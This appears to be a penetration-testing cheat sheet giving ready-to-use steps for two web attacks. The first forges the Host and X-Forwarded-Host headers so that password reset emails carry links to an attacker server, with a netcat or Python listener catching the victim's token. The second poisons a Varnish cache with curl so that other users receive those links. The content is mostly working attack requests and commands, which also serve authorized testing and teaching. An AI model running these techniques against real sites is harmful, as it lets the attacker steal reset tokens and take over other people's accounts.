# Host Header Injection — Password Reset Link Hijack

If the app uses `$_SERVER['HTTP_HOST']` or `request.host` to build the password reset URL without validation, inject your own host to redirect the reset link to your server.

```bash
# Burp: intercept POST /forgot-password, add/modify Host header
POST /forgot-password HTTP/1.1
Host: <LHOST>
# OR:
Host: legitimate.com
X-Forwarded-Host: <LHOST>
X-Host: <LHOST>

# Start listener
python3 -m http.server 80  # or nc -lvnp 80

# The victim receives an email with a reset link pointing to <LHOST>
# Token arrives in your access.log
```

## Varnish Cache Poisoning via Wildcard Route

If the app uses wildcard routing (e.g. Flask `@app.route('/<path:path>')`) and a caching proxy (Varnish, Nginx) sits in front:

1. Send a request with a poisoned Host header to the reset endpoint while behind the cache
2. The cache stores the poisoned response keyed only on the URL path (not the Host)
3. Subsequent legitimate users hitting the same cached URL get the poisoned response pointing to attacker host

```bash
# Check for Varnish: response headers include X-Varnish or Age:
curl -I http://<TARGET>/forgot-password

# Cache poisoning: send with X-Forwarded-Host first, then check if cached
curl -s http://<TARGET>/reset-link \
  -H "X-Forwarded-Host: <LHOST>" \
  # repeat without X-Forwarded-Host — if content shows your host, cache is poisoned
```
